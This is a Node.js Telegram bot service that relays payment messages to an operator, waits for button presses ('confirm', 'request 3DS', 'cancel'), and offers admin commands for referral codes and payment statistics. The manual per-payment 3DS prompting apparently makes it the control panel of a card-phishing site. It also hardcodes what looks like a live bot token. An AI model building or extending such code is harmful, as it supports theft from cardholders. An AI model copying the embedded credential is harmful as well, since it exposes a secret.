const TelegramBot = require('node-telegram-bot-api');


class BotService {
    constructor() {
        this.bot = new TelegramBot("8216977215:AAEqwBaREu4vZvz4yj6d5ICZp5xgyZ8vQjY", { polling: true });
        this.pendingCallbacks = new Map();
        this.ADMIN_CHAT_ID = 7209588642; // Admin ID
        
        // Delete webhook if set
        this.bot.deleteWebHook().then(() => {
            console.log('Webhook deleted, using polling');
        }).catch(err => {
            console.log('Error deleting webhook:', err.message);
        });

        // Register commands for managing referrals
        this.registerCommands();
        
        // Global handler for all callbacks
        this.bot.on('callback_query', async (callbackQuery) => {
            const messageId = callbackQuery.message.message_id;
            const chatId = callbackQuery.message.chat.id;
            
            console.log('Received callback:', { messageId, data: callbackQuery.data });
            console.log('Available messageId in pendingCallbacks:', Array.from(this.pendingCallbacks.keys()));
            
            if (this.pendingCallbacks.has(messageId)) {
                const { resolve, timeout, originalMessage } = this.pendingCallbacks.get(messageId);
                clearTimeout(timeout);
                this.pendingCallbacks.delete(messageId);
                
                if (callbackQuery.data === 'confirm') {
                    console.log('>>> CONFIRM BUTTON PRESSED <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment confirmed' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\n✅ Status: CONFIRMED`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('Sending result: { confirmed: true }');
                    resolve({ confirmed: true });
                } else if (callbackQuery.data === 'request_3ds') {
                    console.log('>>> 3DS BUTTON PRESSED <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '🔐 3DS verification request' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\n🔐 Status: WAITING FOR 3DS VERIFICATION`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('Sending result: { requires3DS: true }');
                    resolve({ requires3DS: true });
                } else if (callbackQuery.data === 'cancel') {
                    console.log('>>> CANCEL BUTTON PRESSED <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Payment cancelled' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\n❌ Status: CANCELLED`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('Sending result: { confirmed: false, reason: "cancelled" }');
                    resolve({ confirmed: false, reason: 'cancelled' });
                }
            } else {
                console.log('Callback for messageId not found in pendingCallbacks');
            }
        });
    }

    async sendMessageAndWait(chatId, message, buttonPayment) {
        // Generate unique temporary ID for this request
        const tempId = `_pending_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Create Promise for waiting response
        const waitPromise = new Promise((resolve) => {
            const timeout = setTimeout(() => {
                // Delete from both possible places (temporary and real ID)
                this.pendingCallbacks.delete(tempId);
                console.log('Confirmation timeout');
                resolve({ confirmed: false, reason: 'timeout' });
            }, 300000); // 5 minutes timeout
            
            // Save with unique temporary key
            this.pendingCallbacks.set(tempId, { resolve, timeout, originalMessage: message });
        });

        // Send message
        const sentMessage = await this.bot.sendMessage(chatId, message, buttonPayment);
        const messageId = sentMessage.message_id;
        console.log('Message sent to Telegram, messageId:', messageId);
        
        // Replace temporary entry with real messageId
        const pendingData = this.pendingCallbacks.get(tempId);
        if (pendingData) {
            this.pendingCallbacks.delete(tempId);
            this.pendingCallbacks.set(messageId, pendingData);
            console.log('Waiting for confirmation for messageId:', messageId);
        } else {
            console.error('ERROR: Data not found for tempId:', tempId);
        }

        return waitPromise;
    }

    registerCommands() {
        const referralService = require('./referral-service');

        // Command /refstats - code statistics
        this.bot.onText(/\/refstats (.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const code = match[1].trim().toUpperCase();
            try {
                const stats = await referralService.getReferralStats(code);
                const message = this.formatReferralStats(stats);
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /reflink - get link for code
        this.bot.onText(/\/reflink (.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const code = match[1].trim().toUpperCase();
            const ReferralCodeModel = require('../models/referral-code-model');
            
            try {
                const referralCode = await ReferralCodeModel.findOne({ code });
                
                if (!referralCode) {
                    await this.bot.sendMessage(msg.chat.id, `❌ Code <b>${code}</b> not found`, { parse_mode: 'HTML' });
                    return;
                }
                
                const siteUrl = process.env.CLIENT_URL || 'http://localhost:3000';
                const referralLink = `${siteUrl}/?ref=${code}`;
                const status = referralCode.isActive ? '✅ Active' : '❌ Inactive';
                
                const message = `🔗 <b>Referral link for code: ${code}</b>\n\n` +
                    `<b>Name:</b> ${referralCode.name}\n` +
                    `<b>Status:</b> ${status}\n\n` +
                    `<b>Link:</b>\n<code>${referralLink}</code>\n\n` +
                    `<i>Copy and use this link</i>`;
                
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /reflist - list of all codes
        this.bot.onText(/\/reflist/, async (msg) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            try {
                const stats = await referralService.getAllStats();
                const message = this.formatAllReferralStats(stats);
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /refcreate - create new code
        this.bot.onText(/\/refcreate\s+(.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const args = match[1].trim().split(/\s+/);
            
            if (args.length < 2) {
                await this.bot.sendMessage(
                    msg.chat.id, 
                    `❌ Wrong command format!\n\n<b>Usage:</b>\n/refcreate CODE NAME\n\n<b>Example:</b>\n/refcreate PROMO2024 New Year Promo`, 
                    { parse_mode: 'HTML' }
                );
                return;
            }
            
            const code = args[0].toUpperCase();
            const name = args.slice(1).join(' ');
            
            try {
                await referralService.createReferralCode(code, name);
                
                const siteUrl = process.env.CLIENT_URL || 'http://localhost:3000';
                const referralLink = `${siteUrl}/?ref=${code}`;
                
                const message = `✅ Referral code created!\n\n` +
                    `<b>Code:</b> ${code}\n` +
                    `<b>Name:</b> ${name}\n\n` +
                    `<b>🔗 Referral link:</b>\n` +
                    `<code>${referralLink}</code>\n\n` +
                    `<i>Use this link to attract users</i>`;
                
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /reftoggle - activate/deactivate code
        this.bot.onText(/\/reftoggle (.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const code = match[1].trim().toUpperCase();
            
            try {
                // First get current status
                const ReferralCodeModel = require('../models/referral-code-model');
                const currentCode = await ReferralCodeModel.findOne({ code });
                if (!currentCode) {
                    await this.bot.sendMessage(msg.chat.id, `❌ Code <b>${code}</b> not found`, { parse_mode: 'HTML' });
                    return;
                }
                
                // Toggle status
                const referralCode = await referralService.toggleReferralCode(code, !currentCode.isActive);
                const status = referralCode.isActive ? '✅ activated' : '❌ deactivated';
                await this.bot.sendMessage(msg.chat.id, `Code <b>${code}</b> ${status}`, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /help - command list
        this.bot.onText(/\/help/, async (msg) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const helpMessage = `
<b>📊 Referral management commands:</b>

/refcreate CODE NAME - create code
/reflink CODE - get link
/refstats CODE - code statistics
/reflist - list all codes
/reftoggle CODE - on/off code
/help - this help

<b>Examples:</b>
/refcreate PROMO2024 2024 Promo
/reflink PROMO2024
/refstats PROMO2024
/reftoggle PROMO2024
            `;
            
            await this.bot.sendMessage(msg.chat.id, helpMessage, { parse_mode: 'HTML' });
        });
    }

    formatReferralStats(stats) {
        return `
<b>📊 Code statistics: ${stats.code}</b>

📌 Name: ${stats.name}
${stats.isActive ? '✅' : '❌'} Status: ${stats.isActive ? 'Active' : 'Inactive'}

<b>Statistics:</b>
👥 Registrations: ${stats.stats.totalRegistrations}
💳 Payments: ${stats.stats.totalPayments}
💰 Amount: ${stats.stats.totalAmount}
📈 Conversion: ${stats.stats.conversionRate}
✅ Users with payments: ${stats.stats.usersWithPayments}
        `;
    }

    formatAllReferralStats(statsList) {
        if (!statsList || statsList.length === 0) {
            return '📊 <b>Referral codes not found</b>\n\nUse /refcreate to create';
        }

        let message = '<b>📊 All referral codes:</b>\n\n';
        
        statsList.forEach((stats, index) => {
            const status = stats.isActive ? '✅' : '❌';
            message += `${index + 1}. ${status} <b>${stats.code}</b> - ${stats.name}\n`;
            message += `   👥 ${stats.stats.totalRegistrations} reg. | 💳 ${stats.stats.totalPayments} payments | 💰 ${stats.stats.totalAmount}\n\n`;
        });

        message += '\n<i>Use /refstats CODE for detailed information</i>';
        
        return message;
    }
}

module.exports = new BotService();